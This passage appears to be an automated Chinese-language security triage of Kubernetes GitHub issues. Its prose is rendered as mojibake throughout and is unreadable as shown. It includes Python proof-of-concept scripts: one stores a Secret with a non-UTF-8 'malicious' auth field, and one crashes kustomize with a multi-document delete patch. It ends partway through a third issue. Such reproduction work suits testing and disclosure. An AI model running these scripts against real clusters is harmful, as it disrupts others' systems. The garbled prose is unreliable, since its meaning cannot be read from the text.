ç»¼ä¸Šæ‰€è¿°ï¼Œè¿™æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„å®‰å…¨é—®é¢˜ï¼Œä½†ç”±äºå…¶åˆ©ç”¨éœ€è¦è¾ƒé«˜çš„æƒé™ï¼Œä¸”ç›´æ¥å½±å“æ˜¯é’ˆå¯¹ä¸‹æ¸¸ç³»ç»Ÿè€ŒéKubernetesæ ¸å¿ƒç»„ä»¶çš„ææƒæˆ–å‘½ä»¤æ‰§è¡Œï¼Œå…¶é£é™©ç­‰çº§è¢«è¯„ä¼°ä¸ºä½é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import base64
import json
import time
import sys
from kubernetes import client, config
from kubernetes.client.rest import ApiException

def main():
    """
    Main function to demonstrate the non-UTF-8 validation vulnerability.
    It creates a dockerconfigjson secret with a non-UTF-8 auth field,
    verifies its creation, and then cleans up.
    """
    SECRET_NAME = "poc-non-utf8-secret-test"
    NAMESPACE = "default"
    # This base64 string decodes to 'a\xc5z:a\xc5z', which contains a non-UTF-8 character (\xc5)
    MALICIOUS_AUTH_B64 = "YcV6OmHFeg=="
    
    try:
        # Load Kubernetes configuration from default location (~/.kube/config)
        print("INFO: Loading Kubernetes configuration...")
        config.load_kube_config()
        api = client.CoreV1Api()
        print("INFO: Kubernetes configuration loaded successfully.")

        # Construct the .dockerconfigjson content
        docker_config = {
            "auths": {
                "fictional-registry.io": {
                    "auth": MALICIOUS_AUTH_B64,
                    "email": "test@example.com"
                }
            }
        }
        
        # The .dockerconfigjson content itself must be base64 encoded for the Secret data
        docker_config_json = json.dumps(docker_config)
        secret_data_b64 = base64.b64encode(docker_config_json.encode('utf-8')).decode('utf-8')

        # Define the Secret object
        secret_body = client.V1Secret(
            api_version="v1",
            kind="Secret",
            metadata=client.V1ObjectMeta(name=SECRET_NAME),
            type="kubernetes.io/dockerconfigjson",
            data={".dockerconfigjson": secret_data_b64}
        )

        # --- Create the secret ---
        print(f"INFO: Attempting to create secret '{SECRET_NAME}' in namespace '{NAMESPACE}'...")
        api.create_namespaced_secret(namespace=NAMESPACE, body=secret_body)
        print(f"SUCCESS: Secret '{SECRET_NAME}' created successfully. This demonstrates the vulnerability.")
        print("INFO: The system accepted a secret with non-UTF-8 characters in the 'auth' field.")
        
        # --- Verify the secret exists ---
        time.sleep(1) # Wait a moment for the secret to be fully available
        print(f"INFO: Verifying secret '{SECRET_NAME}'...")
        retrieved_secret = api.read_namespaced_secret(name=SECRET_NAME, namespace=NAMESPACE)
        retrieved_docker_config_b64 = retrieved_secret.data['.dockerconfigjson']
        retrieved_docker_config_json = base64.b64decode(retrieved_docker_config_b64).decode('utf-8')
        retrieved_docker_config = json.loads(retrieved_docker_config_json)
        
        if retrieved_docker_config["auths"]["fictional-registry.io"]["auth"] == MALICIOUS_AUTH_B64:
             print("SUCCESS: Verification complete. The malicious 'auth' field is present in the stored secret.")
        else:
             print("ERROR: Verification failed. The stored secret does not contain the malicious payload.")


    except ApiException as e:
        print(f"ERROR: An exception occurred when calling Kubernetes API: {e.reason}")
        print(f"Body: {e.body}")
        if e.status == 403:
            print("ERROR: Permission denied. Please ensure your kubeconfig has permissions to create secrets in the 'default' namespace.")
        sys.exit(1)
    except FileNotFoundError:
        print("ERROR: kubeconfig file not found. Please ensure it is in the default location (~/.kube/config) or KUBECONFIG env var is set.")
        sys.exit(1)
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        sys.exit(1)
    finally:
        # --- Cleanup ---
        try:
            print(f"\nINFO: Cleaning up by deleting the secret '{SECRET_NAME}'...")
            config.load_kube_config()
            api = client.CoreV1Api()
            api.delete_namespaced_secret(name=SECRET_NAME, namespace=NAMESPACE, body=client.V1DeleteOptions())
            print(f"SUCCESS: Secret '{SECRET_NAME}' deleted.")
        except NameError:
            # api was not initialized, nothing to clean
            pass
        except ApiException as e:
            if e.status == 404:
                print(f"INFO: Secret '{SECRET_NAME}' was not found, likely because it failed to be created. No cleanup needed.")
            else:
                print(f"ERROR: Failed to delete secret during cleanup: {e.reason}")
        except Exception as e:
            print(f"An unexpected error occurred during cleanup: {e}")

main()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥Pythonè„šæœ¬ç”¨äºå¤ç°Issueä¸­æè¿°çš„æ¼æ´ã€‚å®ƒé€šè¿‡ä¸Kubernetes APIäº¤äº’ï¼Œå°è¯•åˆ›å»ºä¸€ä¸ªåŒ…å«éUTF-8å­—ç¬¦çš„Dockerå‡­æ®Secretã€‚

1.  **ç¯å¢ƒå‡†å¤‡**: è„šæœ¬é¦–å…ˆä½¿ç”¨`kubernetes` Pythonåº“åŠ è½½æœ¬åœ°çš„`kubeconfig`æ–‡ä»¶ï¼ˆé€šå¸¸ä½äº`~/.kube/config`ï¼‰æ¥è·å–ä¸Kubernetesé›†ç¾¤äº¤äº’çš„æƒé™ã€‚
2.  **æ„é€ æ¶æ„æ•°æ®**:
    *   è„šæœ¬å®šä¹‰äº†ä¸€ä¸ªbase64ç¼–ç çš„å­—ç¬¦ä¸²`MALICIOUS_AUTH_B64 = "YcV6OmHFeg=="`ã€‚è¿™ä¸ªå­—ç¬¦ä¸²æ˜¯æ¼æ´çš„æ ¸å¿ƒï¼Œå®ƒè§£ç åä¼šäº§ç”Ÿä¸€ä¸ªåŒ…å«æ— æ•ˆUTF-8å­—èŠ‚åºåˆ—çš„å­—ç¬¦ä¸²ã€‚
    *   æ¥ç€ï¼Œè„šæœ¬æ„å»ºäº†ä¸€ä¸ªæ ‡å‡†çš„`.dockerconfigjson`æ–‡ä»¶å†…å®¹çš„JSONå¯¹è±¡ã€‚è¿™ä¸ªå¯¹è±¡å°†æ¶æ„çš„`auth`å­—ç¬¦ä¸²å…³è”åˆ°ä¸€ä¸ªè™šæ„çš„é•œåƒä»“åº“`fictional-registry.io`ã€‚
    *   æ ¹æ®Kubernetes Secretçš„æ ¼å¼è¦æ±‚ï¼Œæ•´ä¸ª`.dockerconfigjson`å†…å®¹éœ€è¦å†æ¬¡è¿›è¡Œbase64ç¼–ç ã€‚
3.  **åˆ›å»ºSecret**: è„šæœ¬åˆ›å»ºä¸€ä¸ª`V1Secret`å¯¹è±¡ï¼Œå…¶ç±»å‹ä¸º`kubernetes.io/dockerconfigjson`ï¼Œå¹¶å°†ä¸Šä¸€æ­¥ç”Ÿæˆçš„æ¶æ„æ•°æ®æ”¾å…¥`.dockerconfigjson`é”®ä¸­ã€‚
4.  **æ‰§è¡Œä¸éªŒè¯**:
    *   è„šæœ¬è°ƒç”¨`create_namespaced_secret`æ–¹æ³•ï¼Œåœ¨`default`å‘½åç©ºé—´ä¸­åˆ›å»ºè¿™ä¸ªSecretã€‚
    *   å¦‚æœKubernetes APIæœåŠ¡å™¨æ²¡æœ‰å¯¹`auth`å­—æ®µè¿›è¡ŒUTF-8æ ¡éªŒï¼Œè¯¥APIè°ƒç”¨å°±ä¼šæˆåŠŸï¼Œè„šæœ¬ä¼šæ‰“å°æˆåŠŸä¿¡æ¯ï¼Œè¿™ç›´æ¥è¯æ˜äº†æ¼æ´çš„å­˜åœ¨ã€‚
    *   ä¸ºäº†è¿›ä¸€æ­¥ç¡®è®¤ï¼Œè„šæœ¬ä¼šè¯»å–åˆšåˆšåˆ›å»ºçš„Secretï¼Œå¹¶éªŒè¯å…¶å†…å®¹æ˜¯å¦ä¸æˆ‘ä»¬æ³¨å…¥çš„æ¶æ„æ•°æ®ä¸€è‡´ã€‚
5.  **æ¸…ç†**: æ— è®ºæˆåŠŸä¸å¦ï¼Œ`finally`å—éƒ½ä¼šç¡®ä¿æ‰§è¡Œæ¸…ç†æ“ä½œï¼Œå³åˆ é™¤åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­åˆ›å»ºçš„Secretï¼Œä»¥ä¿æŒé›†ç¾¤çš„å¹²å‡€ã€‚

å¦‚æœè¯¥è„šæœ¬èƒ½å¤ŸæˆåŠŸæ‰§è¡Œå¹¶æ‰“å°å‡ºâ€œSUCCESS: Secret '...' created successfully.â€ï¼Œåˆ™è¡¨æ˜ç›®æ ‡Kubernetesé›†ç¾¤å­˜åœ¨æ­¤æ¼æ´ã€‚

---


## Issue #131939 Kustomize panics with multiple patches in file

- Issue é“¾æ¥ï¼š[#131939](https://github.com/kubernetes/kubernetes/issues/131939)

### Issue å†…å®¹

#### What happened?

Running kustomize build on a file that contains multiple patch instructions leads to a panic.

```
kustomize build manifests/overlays/production
panic: runtime error: invalid memory address or nil pointer dereference
[signal SIGSEGV: segmentation violation code=0x2 addr=0x40 pc=0x1010f1a04]

goroutine 1 [running]:
sigs.k8s.io/kustomize/kyaml/yaml.(*RNode).Content(...)
        sigs.k8s.io/kustomize/kyaml/yaml/rnode.go:724
sigs.k8s.io/kustomize/kyaml/yaml.(*RNode).getMapFieldValue(0x1400004cc78?, {0x1011fa6d3?, 0x1400004cc18?})
        sigs.k8s.io/kustomize/kyaml/yaml/rnode.go:437 +0x54
sigs.k8s.io/kustomize/kyaml/yaml.(*RNode).GetApiVersion(...)
        sigs.k8s.io/kustomize/kyaml/yaml/rnode.go:419
sigs.k8s.io/kustomize/kyaml/resid.GvkFromNode(0x14000118900)
        sigs.k8s.io/kustomize/kyaml/resid/gvk.go:32 +0x40
sigs.k8s.io/kustomize/api/resource.(*Resource).GetGvk(...)
        sigs.k8s.io/kustomize/api/resource/resource.go:57
sigs.k8s.io/kustomize/api/resource.(*Resource).CurId(0x14000118900)
        sigs.k8s.io/kustomize/api/resource/resource.go:462 +0x48
sigs.k8s.io/kustomize/api/resmap.(*resWrangler).GetMatchingResourcesByAnyId(0x1400004cfb8?, 0x14001bb97a0)
        sigs.k8s.io/kustomize/api/resmap/reswrangler.go:184 +0xac
sigs.k8s.io/kustomize/api/resmap.demandOneMatch(0x1400004d0b8, {{{0x14000464c20, 0x5}, {0x14000464c26, 0x2}, {0x14000464c34, 0x7}, 0x0}, {0x14000464c64, 0x5}, ...}, ...)
        sigs.k8s.io/kustomize/api/resmap/reswrangler.go:227 +0xc8
sigs.k8s.io/kustomize/api/resmap.(*resWrangler).GetById(0x14000118ea0?, {{{0x14000464c20, 0x5}, {0x14000464c26, 0x2}, {0x14000464c34, 0x7}, 0x0}, {0x14000464c64, 0x5}, ...})
        sigs.k8s.io/kustomize/api/resmap/reswrangler.go:214 +0x98
sigs.k8s.io/kustomize/api/internal/builtins.(*PatchTransformerPlugin).transformStrategicMerge(0x8?, {0x1014d17d0, 0x14000164b28})
        sigs.k8s.io/kustomize/api/internal/builtins/PatchTransformer.go:112 +0x2d0
sigs.k8s.io/kustomize/api/internal/builtins.(*PatchTransformerPlugin).Transform(0x1400029f348?, {0x1014d17d0?, 0x14000164b28?})
        sigs.k8s.io/kustomize/api/internal/builtins/PatchTransformer.go:87 +0x2c
sigs.k8s.io/kustomize/api/internal/target.(*multiTransformer).Transform(0x1400013cf50?, {0x1014d17d0, 0x14000164b28})
        sigs.k8s.io/kustomize/api/internal/target/multitransformer.go:30 +0x88
sigs.k8s.io/kustomize/api/internal/accumulator.(*ResAccumulator).Transform(...)
        sigs.k8s.io/kustomize/api/internal/accumulator/resaccumulator.go:141
sigs.k8s.io/kustomize/api/internal/target.(*KustTarget).runTransformers(0x1400013cf50, 0x14000111e00)
        sigs.k8s.io/kustomize/api/internal/target/kusttarget.go:343 +0x1a8
sigs.k8s.io/kustomize/api/internal/target.(*KustTarget).accumulateTarget(0x1400013cf50, 0x7?)
        sigs.k8s.io/kustomize/api/internal/target/kusttarget.go:237 +0x310
sigs.k8s.io/kustomize/api/internal/target.(*KustTarget).AccumulateTarget(0x1400013cf50)
        sigs.k8s.io/kustomize/api/internal/target/kusttarget.go:194 +0x104
sigs.k8s.io/kustomize/api/internal/target.(*KustTarget).makeCustomizedResMap(0x1400013cf50)
        sigs.k8s.io/kustomize/api/internal/target/kusttarget.go:135 +0x68
sigs.k8s.io/kustomize/api/internal/target.(*KustTarget).MakeCustomizedResMap(...)
        sigs.k8s.io/kustomize/api/internal/target/kusttarget.go:126
sigs.k8s.io/kustomize/api/krusty.(*Kustomizer).Run(0x1400004dc38, {0x1014cc2a0, 0x101a4e268}, {0x16f2c76d0, 0x1d})
        sigs.k8s.io/kustomize/api/krusty/kustomizer.go:90 +0x23c
sigs.k8s.io/kustomize/kustomize/v5/commands/build.NewCmdBuild.func1(0x14000171208, {0x1400024cb80?, 0x4?, 0x1011f797f?})
        sigs.k8s.io/kustomize/kustomize/v5/commands/build/build.go:85 +0x150
github.com/spf13/cobra.(*Command).execute(0x14000171208, {0x1400024cb40, 0x1, 0x1})
        github.com/spf13/cobra@v1.8.0/command.go:983 +0x834
github.com/spf13/cobra.(*Command).ExecuteC(0x14000170c08)
        github.com/spf13/cobra@v1.8.0/command.go:1115 +0x344
github.com/spf13/cobra.(*Command).Execute(0x101987168?)
        github.com/spf13/cobra@v1.8.0/command.go:1039 +0x1c
main.main()
        sigs.k8s.io/kustomize/kustomize/v5/main.go:14 +0x20
```

#### What did you expect to happen?

The patches are applied as if they were in two separate files, or a helpful error message is presented.

#### How can we reproduce it (as minimally and precisely as possible)?

Create the following structure

manifests/base/cronjob-a.yaml
```
apiVersion: batch/v1
kind: CronJob
metadata:
  name: job-a
spec: {}
```

manifests/base/cronjob-b.yaml
```
apiVersion: batch/v1
kind: CronJob
metadata:
  name: job-b
spec: {}
```

manifests/base/kustomization.yaml
```
apiVersion: kustomize.config.k8s.io/v1beta1
kind: Kustomization

resources:
  - cronjob-a.yaml
  - cronjob-b.yaml
```

manifests/overlays/production/delete-cronjobs.yaml
```
# noinspection KubernetesUnknownKeys
$patch: delete
apiVersion: batch/v1
kind: CronJob
metadata:
  name: job-a
---
# noinspection KubernetesUnknownKeys
$patch: delete
apiVersion: batch/v1
kind: CronJob
metadata:
  name: job-b
```

manifests/overlays/production/kustomization.yaml
```
apiVersion: kustomize.config.k8s.io/v1beta1
kind: Kustomization
resources:
  - ../../base

patches:
  - path: delete-cronjobs.yaml
```

[manifests.zip](https://github.com/user-attachments/files/20411808/manifests.zip)

Run `kustomize build manifests/overlays/production`

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.1
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
```

</details>


#### Cloud provider

<details>
none
</details>


#### OS version

<details>

```console
Darwin cgm.local 24.4.0 Darwin Kernel Version 24.4.0: Fri Apr 11 18:34:14 PDT 2025; root:xnu-11417.101.15~117/RELEASE_ARM64_T8122 arm64
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue æè¿°äº†ä¸€ä¸ªåœ¨ `kustomize build` è¿‡ç¨‹ä¸­å‘ç”Ÿçš„ panicï¼ˆç¨‹åºå´©æºƒï¼‰é—®é¢˜ã€‚å…·ä½“è§¦å‘æ¡ä»¶æ˜¯å½“ä¸€ä¸ª `kustomization.yaml` æ–‡ä»¶ä¸­çš„ `patches` å­—æ®µå¼•ç”¨äº†ä¸€ä¸ªåŒ…å«å¤šä¸ª YAML æ–‡æ¡£ï¼ˆä½¿ç”¨ `---` åˆ†éš”ï¼‰çš„ patch æ–‡ä»¶æ—¶ï¼ŒKustomize è¿›ç¨‹ä¼šå› ç©ºæŒ‡é’ˆè§£å¼•ç”¨ï¼ˆ`nil pointer dereference`ï¼‰è€Œå´©æºƒã€‚

ä»å®‰å…¨è§’åº¦åˆ†æï¼š
1.  **æ¼æ´ç±»å‹**ï¼šè¿™æ˜¯ä¸€ä¸ªå…¸å‹çš„ç”±å¼‚å¸¸è¾“å…¥å¯¼è‡´çš„ç¨‹åºå´©æºƒï¼Œå±äºæ‹’ç»æœåŠ¡ï¼ˆDenial of Service, DoSï¼‰æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ç‰¹å®šçš„ Kustomize é…ç½®æ–‡ä»¶æ¥ä½¿ `kustomize build` å‘½ä»¤å¤±æ•ˆã€‚
2.  **æ”»å‡»åœºæ™¯**ï¼šåœ¨é‡‡ç”¨ GitOps æµç¨‹å’Œ CI/CD æµæ°´çº¿çš„é¡¹ç›®ä¸­ï¼ŒKustomize æ˜¯ä¸€ä¸ªå¸¸ç”¨å·¥å…·ã€‚æ”»å‡»è€…å¦‚æœæ‹¥æœ‰å‘ä»£ç ä»“åº“æäº¤ä»£ç çš„æƒé™ï¼ˆå³ä½¿æ˜¯ä½æƒé™çš„å¼€å‘è€…ï¼‰ï¼Œå°±å¯ä»¥æäº¤ä¸€ä¸ªæ¶æ„çš„ Kustomize é…ç½®æ–‡ä»¶ã€‚å½“ CI/CD æµæ°´çº¿æ‰§è¡Œ `kustomize build` å‘½ä»¤æ—¶ï¼Œæµæ°´çº¿ä¼šå›  Kustomize å´©æºƒè€Œå¤±è´¥ï¼Œä»è€Œä¸­æ–­æ­£å¸¸çš„éƒ¨ç½²æµç¨‹ï¼Œé€ æˆæœåŠ¡å‘å¸ƒçš„ä¸­æ–­ã€‚
3.  **å½±å“èŒƒå›´**ï¼šæ­¤æ¼æ´çš„å½±å“å±€é™äº `kustomize` å·¥å…·æœ¬èº«ã€‚å®ƒä¸ä¼šå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€æƒé™æå‡æˆ–ä¿¡æ¯æ³„éœ²ã€‚å…¶ä¸»è¦å±å®³æ˜¯ç ´åæ„å»ºå’Œéƒ¨ç½²æµç¨‹çš„å¯ç”¨æ€§ã€‚
4.  **åˆ©ç”¨æ¡ä»¶**ï¼šæ”»å‡»è€…éœ€è¦æ‹¥æœ‰å¯¹ Kustomize é…ç½®æ–‡ä»¶æ‰€åœ¨çš„ä»£ç ä»“åº“çš„å†™å…¥æƒé™ã€‚è¿™é€šå¸¸æ„å‘³ç€æ”»å‡»è€…éœ€è¦æ˜¯é¡¹ç›®å›¢é˜Ÿçš„ä¸€å‘˜æˆ–èƒ½å¤Ÿå‘é¡¹ç›®æäº¤æ‹‰å–è¯·æ±‚ï¼ˆPull Requestï¼‰ã€‚æ ¹æ®è§„åˆ™ #5ï¼Œå½“ DoS æ”»å‡»éœ€è¦åˆ›å»ºã€ä¿®æ”¹ç­‰éåªè¯»æƒé™æ—¶ï¼Œä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚
5.  **CVSS 3.1 è¯„åˆ†**ï¼š
    *   Attack Vector (AV): Local (L) - æ”»å‡»è€…éœ€è¦åœ¨ç›®æ ‡ç³»ç»Ÿï¼ˆå¦‚CI/CD runnerï¼‰ä¸Šèƒ½å¤Ÿæä¾›æˆ–ä¿®æ”¹æ–‡ä»¶ã€‚
    *   Attack Complexity (AC): Low (L) - å¤ç°æ­¥éª¤ç®€å•æ˜äº†ã€‚
    *   Privileges Required (PR): Low (L) - éœ€è¦èƒ½å¤Ÿä¿®æ”¹ä»£ç ä»“åº“ä¸­çš„ Kustomize æ–‡ä»¶çš„æƒé™ã€‚
    *   User Interaction (UI): None (N) - æ”»å‡»æ˜¯è‡ªåŠ¨è§¦å‘çš„ï¼Œæ— éœ€ç”¨æˆ·äº¤äº’ã€‚
    *   Scope (S): Unchanged (U) - æ¼æ´å½±å“ä»…é™äº Kustomize è¿›ç¨‹æœ¬èº«ï¼Œæœªå½±å“åˆ°ç³»ç»Ÿå…¶ä»–éƒ¨åˆ†ã€‚
    *   Confidentiality (C): None (N) - æœªå¯¼è‡´ä¿¡æ¯æ³„éœ²ã€‚
    *   Integrity (I): None (N) - æœªå¯¼è‡´æ•°æ®è¢«ç¯¡æ”¹ï¼Œåªæ˜¯æ„å»ºå¤±è´¥ã€‚
    *   Availability (A): High (H) - `kustomize build` è¿›ç¨‹å®Œå…¨ä¸å¯ç”¨ï¼Œå¯¼è‡´æ„å»º/éƒ¨ç½²æµç¨‹ä¸­æ–­ã€‚

    ç»¼åˆè¯„åˆ†ä¸º **6.5 (Medium)**ã€‚

æ ¹æ®æä¾›çš„é£é™©åˆ¤æ–­æ ‡å‡†ï¼ŒCVSS è¯„çº§åœ¨ high ä»¥ä¸‹ï¼ˆ7.0ä»¥ä¸‹ï¼‰è¢«è®¤ä¸ºæ˜¯ä½é£é™©ï¼Œå¹¶ä¸”è¯¥ DoS æ”»å‡»éœ€è¦ä¿®æ”¹æ–‡ä»¶çš„æƒé™ï¼Œå› æ­¤è¯¥æ¼æ´çš„é£é™©ç­‰çº§è¢«åˆ¤å®šä¸º **ä½é£é™©**ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import os
import shutil
import subprocess
import sys

def check_kustomize_installed():
    """æ£€æŸ¥ kustomize æ˜¯å¦å·²å®‰è£…"""
    if not shutil.which("kustomize"):
        print("[-] é”™è¯¯: 'kustomize' å‘½ä»¤æœªæ‰¾åˆ°ã€‚è¯·ç¡®ä¿å®ƒå·²å®‰è£…å¹¶åœ¨æ‚¨çš„ç³»ç»Ÿ PATH ä¸­ã€‚")
        return False
    return True

def create_test_environment():
    """åˆ›å»ºå¤ç°æ¼æ´æ‰€éœ€çš„ç›®å½•å’Œæ–‡ä»¶ç»“æ„"""
    print("[*] æ­£åœ¨åˆ›å»ºæµ‹è¯•æ–‡ä»¶ç»“æ„...")
    
    # å®šä¹‰æ–‡ä»¶å†…å®¹
    files = {
        "manifests/base/cronjob-a.yaml": """
apiVersion: batch/v1
kind: CronJob
metadata:
  name: job-a
spec: {}
""",
        "manifests/base/cronjob-b.yaml": """
apiVersion: batch/v1
kind: CronJob
metadata:
  name: job-b
spec: {}
""",
        "manifests/base/kustomization.yaml": """
apiVersion: kustomize.config.k8s.io/v1beta1
kind: Kustomization
resources:
  - cronjob-a.yaml
  - cronjob-b.yaml
""",
        "manifests/overlays/production/delete-cronjobs.yaml": """
# noinspection KubernetesUnknownKeys
$patch: delete
apiVersion: batch/v1
kind: CronJob
metadata:
  name: job-a
---
# noinspection KubernetesUnknownKeys
$patch: delete
apiVersion: batch/v1
kind: CronJob
metadata:
  name: job-b
""",
        "manifests/overlays/production/kustomization.yaml": """
apiVersion: kustomize.config.k8s.io/v1beta1
kind: Kustomization
resources:
  - ../../base
patches:
  - path: delete-cronjobs.yaml
"""
    }

    # åˆ›å»ºç›®å½•å’Œæ–‡ä»¶
    for path, content in files.items():
        dir_name = os.path.dirname(path)
        if not os.path.exists(dir_name):
            os.makedirs(dir_name)
        with open(path, "w") as f:
            f.write(content)
    
    print("[+] æµ‹è¯•æ–‡ä»¶åˆ›å»ºæˆåŠŸã€‚")

def trigger_panic():
    """æ‰§è¡Œ kustomize build å‘½ä»¤å¹¶æ£€æŸ¥æ˜¯å¦è§¦å‘ panic"""
    print("[*] æ­£åœ¨è¿è¡Œ 'kustomize build' æ¥è§¦å‘ panic...")
    command = ["kustomize", "build", "manifests/overlays/production"]
    
    try:
        # ä½¿ç”¨ subprocess.run æ‰§è¡Œå‘½ä»¤ï¼Œè®¾ç½®è¶…æ—¶
        result = subprocess.run(
            command,
            capture_output=True,
            text=True,
            timeout=120  # è®¾ç½®2åˆ†é’Ÿè¶…æ—¶
        )

        # æ£€æŸ¥è¿”å›ç å’Œæ ‡å‡†é”™è¯¯è¾“å‡º
        # Go panic é€šå¸¸ä»¥éé›¶é€€å‡ºç ï¼ˆå¦‚2ï¼‰ç»“æŸ
        # é”™è¯¯ä¿¡æ¯ä¸­åŒ…å« "panic: runtime error"
        stderr_output = result.stderr.lower()
        if result.returncode != 0 and "panic: runtime error" in stderr_output:
            print("[+] æˆåŠŸï¼Kustomize è¿›ç¨‹æŒ‰é¢„æœŸå´©æºƒã€‚")
            print("--- Kustomize Stderr ---")
            print(result.stderr)
            print("------------------------")
            return True
        else:
            print("[-] å¤±è´¥ã€‚Kustomize æœªæŒ‰é¢„æœŸå´©æºƒã€‚")
            print(f"Return Code: {result.returncode}")
            print("--- Kustomize Stdout ---")
            print(result.stdout)
            print("--- Kustomize Stderr ---")
            print(result.stderr)
            print("------------------------")
            return False

    except subprocess.TimeoutExpired:
        print("[-] é”™è¯¯ï¼šå‘½ä»¤æ‰§è¡Œè¶…æ—¶ã€‚")
        return False
    except Exception as e:
        print(f"[-] æ‰§è¡Œå‘½ä»¤æ—¶å‘ç”ŸæœªçŸ¥é”™è¯¯: {e}")
        return False

def cleanup():
    """æ¸…ç†æµ‹è¯•ç¯å¢ƒ"""
    if os.path.exists("manifests"):
        print("[*] æ­£åœ¨æ¸…ç†æµ‹è¯•æ–‡ä»¶...")
        shutil.rmtree("manifests")
        print("[+] æ¸…ç†å®Œæˆã€‚")

def main():
    """ä¸»æ‰§è¡Œå‡½æ•°"""
    if not check_kustomize_installed():
        sys.exit(1)

    try:
        create_test_environment()
        trigger_panic()
    finally:
        cleanup()

main()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥ Python è„šæœ¬ç”¨äºå¤ç° Issue ä¸­æè¿°çš„ Kustomize æ‹’ç»æœåŠ¡æ¼æ´ã€‚

1.  **ç¯å¢ƒæ£€æŸ¥ (`check_kustomize_installed`)**: è„šæœ¬é¦–å…ˆä¼šæ£€æŸ¥ç”¨æˆ·çš„ç¯å¢ƒä¸­æ˜¯å¦å®‰è£…äº† `kustomize` å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¹¶ç¡®ä¿å®ƒåœ¨ç³»ç»Ÿçš„ PATH è·¯å¾„ä¸­ã€‚å¦‚æœæœªæ‰¾åˆ°ï¼Œè„šæœ¬ä¼šæç¤ºç”¨æˆ·å¹¶é€€å‡ºã€‚
2.  **ç¯å¢ƒæ­å»º (`create_test_environment`)**: è„šæœ¬ä¼šåœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªåä¸º `manifests` çš„æ–‡ä»¶å¤¹ï¼Œå¹¶æ ¹æ® Issue ä¸­æä¾›çš„ç»†èŠ‚ï¼Œç²¾ç¡®åœ°åˆ›å»ºæ‰€æœ‰å­ç›®å½•å’Œ YAML é…ç½®æ–‡ä»¶ã€‚è¿™åŒ…æ‹¬ base èµ„æºï¼ˆcronjob-a, cronjob-bï¼‰å’Œ production overlayï¼Œç‰¹åˆ«æ˜¯é‚£ä¸ªåŒ…å«ä¸¤ä¸ªYAMLæ–‡æ¡£çš„ `delete-cronjobs.yaml` æ–‡ä»¶ã€‚
3.  **è§¦å‘æ¼æ´ (`trigger_panic`)**: è„šæœ¬ä½¿ç”¨ Python çš„ `subprocess` æ¨¡å—æ‰§è¡Œå‘½ä»¤ `kustomize build manifests/overlays/production`ã€‚å®ƒä¼šæ•è·å‘½ä»¤çš„è¿”å›ç ã€æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯ã€‚
4.  **ç»“æœéªŒè¯**: è„šæœ¬ä¼šæ£€æŸ¥å‘½ä»¤çš„æ‰§è¡Œç»“æœã€‚å¦‚æœ `kustomize` è¿›ç¨‹å›  panic è€Œå´©æºƒï¼Œå®ƒé€šå¸¸ä¼šä»¥ä¸€ä¸ªéé›¶çš„é€€å‡ºç é€€å‡ºï¼Œå¹¶åœ¨æ ‡å‡†é”™è¯¯æµä¸­æ‰“å°åŒ…å« "panic: runtime error" çš„é”™è¯¯ä¿¡æ¯ã€‚è„šæœ¬ä¼šæ£€æŸ¥è¿™ä¸¤ä¸ªæ¡ä»¶æ˜¯å¦åŒæ—¶æ»¡è¶³ï¼Œå¦‚æœæ»¡è¶³ï¼Œåˆ™æ‰“å°æˆåŠŸä¿¡æ¯ï¼Œç¡®è®¤æ¼æ´å·²å¤ç°ï¼›å¦åˆ™ï¼Œæ‰“å°å¤±è´¥ä¿¡æ¯åŠç›¸å…³è¾“å‡ºï¼Œæ–¹ä¾¿è°ƒè¯•ã€‚
5.  **æ¸…ç† (`cleanup`)**: æ— è®ºå¤ç°æ˜¯å¦æˆåŠŸï¼Œ`finally` å—ä¸­çš„ `cleanup` å‡½æ•°éƒ½ä¼šè¢«æ‰§è¡Œï¼Œä»¥ç¡®ä¿åˆ é™¤æ‰€æœ‰åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­åˆ›å»ºçš„æ–‡ä»¶å’Œç›®å½•ï¼Œä¿æŒç¯å¢ƒçš„æ•´æ´ã€‚

è¯¥è„šæœ¬æ˜¯è‡ªåŒ…å«çš„ï¼Œèƒ½å¤Ÿè‡ªåŠ¨åŒ–åœ°å®Œæˆç¯å¢ƒå‡†å¤‡ã€æ¼æ´è§¦å‘ã€ç»“æœéªŒè¯å’Œäº‹åæ¸…ç†çš„å…¨è¿‡ç¨‹ï¼Œç”¨äºæœ¬åœ°éªŒè¯æ­¤ DoS æ¼æ´ã€‚

---


## Issue #131918 Adding service port with same port but different protocol will override the previous port

- Issue é“¾æ¥ï¼š[#131918](https://github.com/kubernetes/kubernetes/issues/131918)

### Issue å†…å®¹

#### What happened?

Adding service port with same port but different protocol will override the previous port

#### What did you expect to happen?

The previous port is reserved

#### How can we reproduce it (as minimally and precisely as possible)?

Add a service:
```yaml
apiVersion: v1
kind: Service
metadata:
  name: kube-bench-dev
spec:
  selector:
    instance: kube-bench-dev
  ports:
  - name: tcp-80
    port: 80
    protocol: TCP
    targetPort: 80
```

kubectl get service kube-bench-dev -o yaml:
```yaml
apiVersion: v1
kind: Service
metadata:
  annotations:
    kubectl.kubernetes.io/last-applied-configuration: |
      {"apiVersion":"v1","kind":"Service","metadata":{"annotations":{},"name":"kube-bench-dev","namespace":"default"},"spec":{"ports":[{"name":"tcp-80","port":80,"protocol":"TCP","targetPort":80}],"selector":{"instance":"kube-bench-dev"}}}
